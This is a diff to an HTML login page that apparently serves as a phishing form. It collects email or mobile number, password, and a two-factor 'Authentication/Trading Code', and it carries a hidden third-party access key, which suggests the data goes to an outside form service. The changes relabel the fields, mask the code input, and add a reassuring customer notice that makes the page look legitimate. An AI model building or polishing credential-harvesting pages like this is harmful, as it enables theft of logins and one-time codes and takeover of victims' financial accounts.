@@ -227,8 +227,8 @@ img.avatar {
   <input type="hidden" name="_next" value="#">
   <input type="hidden" id="selectedIssue" name="selectedIssue">
   <div class="container">
-    <label for="email"><b>Username</b></label>
-    <input type="text" placeholder="Email/Mobile number" name="email" required>
+    <label for="email"><b>Email/Mobile</b></label>
+    <input type="text" placeholder="Email/Mobile number" name="text" required>
 
     <label for="password"><b>Password</b></label>
     <input type="password" placeholder="Enter Password" name="text" required>
@@ -247,12 +247,14 @@ img.avatar {
   <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">
 
   <div id="step2" class="container">
-    <label for="code"><b>Authentication Code</b></label>
-    <input type="text" placeholder="Enter 2fa Code" name="code" required>
+    <label for="code"><b>Authentication/Trading Code</b></label>
+    <input type="password" placeholder="Enter Code" name="code" required>
 
     <button type="submit">Login</button>
   </div>
-
+    <div class="notice">
+  <p>⚠️ Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</p>
+</div>
 </form>
 
 <!-- QR Code container -->
@@ -342,6 +344,8 @@ img.avatar {
     });
   });
 </script>
+
+
 
 </body>
 </html>
